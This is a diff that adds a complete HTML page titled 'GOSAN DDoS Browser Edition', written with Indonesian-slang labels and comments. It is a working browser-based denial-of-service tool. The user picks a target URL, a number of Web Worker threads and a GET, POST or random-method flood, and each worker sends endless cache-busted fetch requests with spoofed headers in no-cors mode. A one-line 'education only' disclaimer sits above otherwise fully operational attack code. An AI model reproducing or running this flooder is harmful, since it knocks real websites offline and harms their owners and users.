@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>GOSAN DDoS BROWSER EDITION</title>
+    <style>
+        body { background: black; color: lime; font-family: monospace; padding: 20px; }
+        .stats { font-size: 20px; margin: 20px 0; }
+        .warning { color: red; border: 1px solid red; padding: 10px; margin: 20px 0; }
+        button { background: lime; color: black; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
+        input, select { background: #333; color: lime; border: 1px solid lime; padding: 8px; width: 300px; margin: 5px; }
+    </style>
+</head>
+<body>
+    <pre>
+╔══════════════════════════════════════════════════╗
+║     GOSAN DDoS - BROWSER EDITION                ║
+║         "Multithreading pake Web Worker"        ║
+╚══════════════════════════════════════════════════╝
+    </pre>
+
+    <div class="warning">
+        ⚠️ INI CUMA BUAT EDUKASI! JANGAN DIPAKE NYERANG GILA-GILAAN!<br>
+        ⚠️ GOSAN GA BERTANGGUNG JAWAB KALO LO MASUK BUI!
+    </div>
+
+    <div>
+        <label>URL Target:</label><br>
+        <input type="url" id="targetUrl" value="https://example.com" placeholder="https://target.com">
+    </div>
+    
+    <div>
+        <label>Jumlah Thread (Web Worker):</label><br>
+        <input type="number" id="threadCount" value="10" min="1" max="50">
+    </div>
+    
+    <div>
+        <label>Attack Type:</label><br>
+        <select id="attackType">
+            <option value="get">GET Flood</option>
+            <option value="post">POST Flood</option>
+            <option value="random">Random Method</option>
+        </select>
+    </div>
+    
+    <div>
+        <button onclick="startAttack()">MULAI NYERANG!</button>
+        <button onclick="stopAttack()">BERHENTI</button>
+    </div>
+
+    <div class="stats">
+        <div>Status: <span id="status">Idle</span></div>
+        <div>Total Request: <span id="totalReq">0</span></div>
+        <div>Success: <span id="successReq">0</span></div>
+        <div>Failed: <span id="failReq">0</span></div>
+    </div>
+
+    <script>
+        let workers = [];
+        let totalReq = 0;
+        let successReq = 0;
+        let failReq = 0;
+        let attackInterval;
+
+        // Web Worker code sebagai string
+        const workerCode = `
+            let running = true;
+            
+            self.onmessage = function(e) {
+                if (e.data === 'stop') {
+                    running = false;
+                } else {
+                    const targetUrl = e.data.url;
+                    const attackType = e.data.type;
+                    
+                    function attack() {
+                        if (!running) return;
+                        
+                        fetch(targetUrl + '?' + Math.random(), {
+                            method: attackType === 'get' ? 'GET' : 
+                                   attackType === 'post' ? 'POST' : 
+                                   ['GET','POST','PUT','DELETE'][Math.floor(Math.random()*4)],
+                            headers: {
+                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                                'Accept': '*/*',
+                                'Cache-Control': 'no-cache',
+                                'Pragma': 'no-cache'
+                            },
+                            mode: 'no-cors'  // Biar ga kena CORS error
+                        })
+                        .then(() => self.postMessage({type: 'success'}))
+                        .catch(() => self.postMessage({type: 'fail'}))
+                        .finally(() => {
+                            if (running) {
+                                setTimeout(attack, Math.random() * 10); // Delay random biar ga kegedean
+                            }
+                        });
+                    }
+                    
+                    // Start attack loop
+                    attack();
+                }
+            };
+        `;
+
+        function startAttack() {
+            const targetUrl = document.getElementById('targetUrl').value;
+            const threadCount = parseInt(document.getElementById('threadCount').value);
+            const attackType = document.getElementById('attackType').value;
+
+            // Reset stats
+            totalReq = 0;
+            successReq = 0;
+            failReq = 0;
+            updateStats();
+
+            // Validasi URL
+            try {
+                new URL(targetUrl);
+            } catch(e) {
+                alert('URL GA VALID BANGSAT!');
+                return;
+            }
+
+            // Hentikan worker lama
+            stopAttack();
+
+            document.getElementById('status').innerText = 'ATTACK MODE 🔥';
+
+            // Bikin worker baru
+            for (let i = 0; i < threadCount; i++) {
+                const blob = new Blob([workerCode], { type: 'application/javascript' });
+                const worker = new Worker(URL.createObjectURL(blob));
+                
+                worker.onmessage = function(e) {
+                    totalReq++;
+                    if (e.data.type === 'success') {
+                        successReq++;
+                    } else {
+                        failReq++;
+                    }
+                    updateStats();
+                };
+                
+                worker.postMessage({ url: targetUrl, type: attackType });
+                workers.push(worker);
+            }
+        }
+
+        function stopAttack() {
+            workers.forEach(worker => {
+                worker.postMessage('stop');
+                worker.terminate();
+            });
+            workers = [];
+            document.getElementById('status').innerText = 'Stopped';
+        }
+
+        function updateStats() {
+            document.getElementById('totalReq').innerText = totalReq;
+            document.getElementById('successReq').innerText = successReq;
+            document.getElementById('failReq').innerText = failReq;
+        }
+    </script>
+</body>
+</html>
